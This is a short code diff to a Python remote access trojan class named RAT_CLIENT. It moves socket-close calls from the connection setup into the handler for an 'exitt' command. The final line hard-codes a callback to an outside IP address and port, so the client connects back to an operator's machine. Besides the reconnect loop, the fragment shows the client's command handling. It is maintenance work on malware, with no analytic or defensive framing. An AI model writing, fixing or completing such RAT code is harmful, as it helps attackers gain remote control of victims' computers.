@@ -41,9 +41,6 @@ class RAT_CLIENT:
         self.curdir = os.getcwd()
 
     def build_connection(self):
-        s.close()
-        client.close()
-        time.sleep(5)
         connected = False
         global s
         while not connected:  
@@ -90,6 +87,8 @@ class RAT_CLIENT:
 
             elif command == 'exitt':
                 s.send(b"exit")
+                s.close()
+                client.close()
                 break
 
 rat = RAT_CLIENT('138.68.79.95', 1431)
